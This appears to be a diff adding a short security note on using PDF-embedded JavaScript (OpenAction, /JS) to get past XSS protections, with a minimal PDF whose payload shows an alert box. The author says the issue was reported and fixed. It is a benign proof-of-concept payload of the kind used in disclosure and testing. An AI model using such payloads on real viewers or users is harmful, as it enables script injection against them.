@@ -1,0 +1,30 @@
+PDF Bypass ⚠️ | Cross-Site Scripting | Microsoft 
+
+To bypass PDF-based Cross-Site Scripting (XSS) protection, you can embed malicious scripts in JavaScript actions within the PDF. These scripts can execute when the PDF is opened in a vulnerable viewer. For instance, you can use the `/JavaScript` entry in the PDF's catalog or the `OpenAction` attribute to trigger the script. Always ensure you have permission to test any systems or documents for vulnerabilities.
+
+Here’s a basic example of how to embed JavaScript in a PDF to attempt a bypass:
+
+ ```pdf
+ %PDF-1.4
+ 1 0 obj
+ <<
+ /Type /Catalog
+ /OpenAction 2 0 R
+ >>
+ endobj
+ 2 0 obj
+ <<
+ /S /JavaScript
+ /JS (app.alert('XSS');)
+ >>
+ endobj
+ trailer
+ <<
+ /Root 1 0 R
+ >>
+ %%EOF
+ ```
+
+ This PDF will execute the JavaScript `app.alert('XSS');` when opened, displaying an alert with the message "XSS". Note that modern PDF viewers often have mitigations for such attacks.
+
+Reminder 💡: I reported this vulnerability, and the issue was successfully resolved ✅
